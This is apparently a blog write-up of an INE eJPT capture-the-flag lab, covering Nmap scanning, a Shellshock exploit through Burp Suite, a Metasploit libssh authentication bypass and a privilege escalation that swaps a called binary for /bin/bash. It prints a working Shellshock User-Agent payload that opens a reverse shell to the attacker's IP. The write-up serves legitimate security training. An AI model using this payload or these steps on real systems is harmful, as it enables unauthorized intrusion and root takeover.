---
layout: post
title: "System-Host Based Attacks CTF 2 Write-up"
date: 2026-08-11
link: https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student
link_text: "INE eJPT Course"
categories: ctf-writeups
---
# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.

**Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

**Flags to Capture:**

- **Flag 1**: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.
- **Flag 2**: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
- **Flag 3**: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
- **Flag 4**: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.

# Tools

The best tools for this lab are:

- Nmap
- Burp Suite
- Metasploit Framework

---

### Note

In this lab, the flag will follow the format: FLAG1_MD5Hash. For example, FLAG1_0f4d0db3668dd58cabb9eb409657eaa8. You need to submit only the MD5 hash string, excluding the underscore (_). For instance: 0f4d0db3668dd58cabb9eb409657eaa8.

---
# Task 1

**Clue:** Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.

The first step is to run an Nmap scan.

`nmap -sS -A -p- -T4 target.ine.local`
- `-sS`: runs a TCP SYN scan
- `-A`: enables OS detection, version detection, script scanning, and traceroute
- `-p-`: sets the port range from 1-65535
- `-T4`: sets the aggressiveness of the scan to a 4 out of 5

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/nmap.png)
*Figure 1: Nmap scan showing port 80 running http*

Port 80 is detected. Now, investigate the website in a browser.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/homepage.png)
*Figure 2: Website homepage*

The website redirects to `/browser.cgi` for its homepage. This is exploitable via the **Shellshock** vulnerability (CVE-2014-6271). To exploit it, open **BurpSuite**, go to the `Proxy` tab, and set **FoxyProxy** to the `Burp Suite / ZAP` setting.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/foxyproxy.png)
*Figure 3: Setting browser extension FoxyProxy to correct setting*

Follow these steps to execute the exploit:
1. Ensure `Intercept is on` and reload or navigate to `target1.ine.local`. Then, right-click and click `Send to Repeater`.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/burp_proxy.png)
*Figure 4: Steps for Burp Proxy*

2. Set up a local Netcat listener with `nc -lvnp 1234`.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/listener.png)
*Figure 5: Netcat listener*

3. Navigate to the `Repeater` tab in Burp and change the `User-Agent` field to `() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/[LOCAL IP]/1234 0>&1'`. Click `Send`.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/burp_repeater.png)
*Figure 6: Steps for Burp Repeater*

The Netcat listener will have connected to an interactive shell session on the target. Navigate to the root directory to find `flag.txt`.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/flag1.png)
*Figure 7: Flag 1*

---
# Task 2

**Clue:** In the server's root directory, there might be something hidden. Explore `/opt/apache/htdocs/` carefully to find the next flag on target1.ine.local.

Flag 2 is located in a hidden directory in `/opt/apache/htdocs/`. Use `ls -a` to see it.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/flag2.png)
*Figure 8: Flag 2*

---
# Task 3

**Clue:** Investigate the user's home directory and consider using `libssh_auth_bypass` to uncover the flag on target2.ine.local.

Run the same Nmap scan from figure 1.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/nmap_2.png)
*Figure 9: Nmap scan for target 2*

Port 22 is open. Navigate to the `libssh_auth_bypass` module in msfconsole.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/module_selection.png)
*Figure 10: Module selection*

Prepare the module by using `set RHOSTS target2.ine.local` and `set SPAWN_PTY true`, and then run the module. Activate the spawned session and get the third flag.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/flag3.png)
*Figure 11: Flag 3*

---
# Task 4

**Clue:** The most restricted areas often hold the most valuable secrets. Look into the `/root` directory to find the hidden flag on target2.ine.local.

The shell spawned does not have access to the `/root` directory. Privilege escalation is necessary. In figure 11, two other files, `greetings` and `welcome` can be seen in the `/home/user` directory. The user does not have permission to run `greetings`, but `welcome` outputs "Welcome to Attack Defense Labs."

To check how this is exploitable, run `strings welcome | grep greetings` to check if `welcome` calls `greetings`.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/grep_greetings.png)
*Figure 12: Greetings string is present in welcome executable*

The `greetings` string does appear in `welcome`. Delete the current `greetings` file, and replace it with `/bin/bash` by using `cp /bin/bash greetings`. Run `welcome` again and a root shell will appear.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/root_shell.png)
*Figure 13: Root shell*

Navigate to `/root` to get the final flag.

![](/assets/writeup_assets/system_host_based_attacks_ctf_2_writeup/flag4.png)
*Figure 14: Flag 4*

